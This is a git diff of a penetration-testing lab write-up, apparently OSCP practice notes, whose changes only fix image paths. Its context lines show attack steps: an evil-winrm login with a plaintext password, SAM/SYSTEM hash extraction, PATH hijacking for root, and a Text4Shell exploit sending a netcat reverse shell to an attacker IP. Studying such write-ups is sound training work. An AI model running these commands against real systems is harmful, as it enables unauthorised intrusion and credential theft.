@@ -368,7 +368,7 @@ Optimizers applied:
 
 Do the ligolo proxy to let our network enable to connect the MS01
 
-![Pasted image 20260108193007.png](/ob/Pasted%20image%2020260108193007.png)
+![Pasted image 20260108193007.png](Pasted%20image%2020260108193007.png)
 
 ```
 └─# evil-winrm -i 10.10.161.148 -u sql_svc -p Dolphin1
@@ -382,7 +382,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 ```
 
-![Pasted image 20260108212433.png](/ob/Pasted%20image%2020260108212433.png)
+![Pasted image 20260108212433.png](Pasted%20image%2020260108212433.png)
 
 {{< toggle "Tag 🏷️" >}}
 
@@ -391,9 +391,9 @@ Info: Establishing connection to remote endpoint
 {{< /toggle >}}
 
 In the Windows old folder , Found the SAM and SYSTEM file can be used to tom\_admin hash\
-![Pasted image 20251230003228.png](/ob/Pasted%20image%2020251230003228.png)
+![Pasted image 20251230003228.png](Pasted%20image%2020251230003228.png)
 
-![Pasted image 20251230003747.png](/ob/Pasted%20image%2020251230003747.png)
+![Pasted image 20251230003747.png](Pasted%20image%2020251230003747.png)
 
 ***
 
@@ -559,15 +559,15 @@ john@oscp:~$
 
 `Strings RESET_PASSWD` to read the strings data and found the kiero account
 
-![Pasted image 20251220124705.png](/ob/Pasted%20image%2020251220124705.png)
+![Pasted image 20251220124705.png](Pasted%20image%2020251220124705.png)
 
-![Pasted image 20251220124754.png](/ob/Pasted%20image%2020251220124754.png)
+![Pasted image 20251220124754.png](Pasted%20image%2020251220124754.png)
 
 After su to the kiero , this program use the chpasswd ; however, it dont specially say it in the `/bin` or how where , so i can change the PATH to let the root go in my shell
 
-![Pasted image 20251220135822.png](/ob/Pasted%20image%2020251220135822.png)
+![Pasted image 20251220135822.png](Pasted%20image%2020251220135822.png)
 
-![Pasted image 20251220143256.png](/ob/Pasted%20image%2020251220143256.png)
+![Pasted image 20251220143256.png](Pasted%20image%2020251220143256.png)
 
 ```
 john@oscp:~$ cd /tmp
@@ -644,13 +644,13 @@ Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds
 
 # Web Recon 8080 🪲
 
-![Pasted image 20251221004247.png](/ob/Pasted%20image%2020251221004247.png)
+![Pasted image 20251221004247.png](Pasted%20image%2020251221004247.png)
 
 the website is created by java of SpringBoot
 
 ### WebSite Directory BurteForce
 
-![Pasted image 20251221011107.png](/ob/Pasted%20image%2020251221011107.png)
+![Pasted image 20251221011107.png](Pasted%20image%2020251221011107.png)
 
 ```
 └─# feroxbuster -u http://192.168.109.150:8080
@@ -697,7 +697,7 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 {{< /toggle >}}
 
 base on the `feroxbuster` to find the version and do the RCE\
-![Pasted image 20251221011130.png](/ob/Pasted%20image%2020251221011130.png)
+![Pasted image 20251221011130.png](Pasted%20image%2020251221011130.png)
 
 ```
 Apache Commons Text 1.10.0 - Remote Code Execution
@@ -705,13 +705,13 @@ Apache Commons Text 1.10.0 - Remote Code Execution
 
 google search
 
-![Pasted image 20251221011229.png](/ob/Pasted%20image%2020251221011229.png)
+![Pasted image 20251221011229.png](Pasted%20image%2020251221011229.png)
 
 CVE Link : https://github.com/808ale/CVE-2022-42889-Text4Shell-POC , and i do the ping myself to do the POC
 
-![Pasted image 20251221013630.png](/ob/Pasted%20image%2020251221013630.png)
+![Pasted image 20251221013630.png](Pasted%20image%2020251221013630.png)
 
-![Pasted image 20251221013932.png](/ob/Pasted%20image%2020251221013932.png)
+![Pasted image 20251221013932.png](Pasted%20image%2020251221013932.png)
 
 ```shell
 uv run text4shell.py -u "http://192.168.109.150:8080/search?query=" -c 'busybox nc 192.168.45.190 500 -e sh' -m 'rce'
@@ -745,7 +745,7 @@ ps auxwwwwwwww
 ```
 
 Found the java -Xdebug -Xrunjdwp, read the /opt/stats/App.java to upgrade the root : reference  https://www.ioactive.com/hacking-java-debug-wire-protocol-or-how/\
-![Pasted image 20251223170935.png](/ob/Pasted%20image%2020251223170935.png)
+![Pasted image 20251223170935.png](Pasted%20image%2020251223170935.png)
 
 # Recon 192.168.X.151
 
@@ -781,7 +781,7 @@ Nmap done: 1 IP address (1 host up) scanned in 13.00 seconds
 
 ### Web Recon 80 🪲
 
-![Pasted image 20260108140650.png](/ob/Pasted%20image%2020260108140650.png)
+![Pasted image 20260108140650.png](Pasted%20image%2020260108140650.png)
 
 ### WebSite Directory BurteForce
 
@@ -837,10 +837,10 @@ Disconnected, goodbye.
 See you at ClueCon! http://www.cluecon.com/
 ```
 
-![Pasted image 20260108141044.png](/ob/Pasted%20image%2020260108141044.png)
+![Pasted image 20260108141044.png](Pasted%20image%2020260108141044.png)
 
 i restart the machine as the first time is failed , but after the restart ,it successfully rce , and i also use the https://www.revshells.com/ to the revshell\
-![Pasted image 20260108142107.png](/ob/Pasted%20image%2020260108142107.png)
+![Pasted image 20260108142107.png](Pasted%20image%2020260108142107.png)
 
 ```
 
@@ -858,9 +858,9 @@ Content-Length: 11
 oscp\chris
 ```
 
-![Pasted image 20260108142704.png](/ob/Pasted%20image%2020260108142704.png)
+![Pasted image 20260108142704.png](Pasted%20image%2020260108142704.png)
 
-![Pasted image 20260108142642.png](/ob/Pasted%20image%2020260108142642.png)
+![Pasted image 20260108142642.png](Pasted%20image%2020260108142642.png)
 
 ### chris to admin
 
